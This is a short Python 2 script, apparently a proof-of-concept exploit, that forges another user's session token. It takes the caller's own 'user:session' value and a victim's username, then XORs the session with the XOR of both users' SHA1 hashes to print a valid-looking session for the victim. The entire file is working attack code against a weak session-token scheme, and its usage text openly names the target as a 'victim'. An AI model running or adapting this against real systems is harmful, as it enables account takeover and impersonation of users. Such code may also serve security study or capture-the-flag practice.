#!/usr/bin/env python

import sys

from hashlib import sha1


def string_xor(s1, s2):
    if len(s1) != len(s2):
        raise ValueError("mismatched lengths")

    r = []
    for c1, c2 in zip(s1, s2):
        r.append(chr(ord(c1) ^ ord(c2)))

    return ''.join(r)


if len(sys.argv) <= 2:
    print("usage: %s <sessionid> <victim>")
    sys.exit(1)


user, session = sys.argv[1].strip().split(":")
session = session.decode('hex')

victim = sys.argv[2].strip()

user_hash = sha1(user).digest()
victim_hash = sha1(victim).digest()
hash_xor = string_xor(user_hash, victim_hash)

victim_session = string_xor(session, hash_xor).encode("hex")

print("%s:%s" % (victim, victim_session))
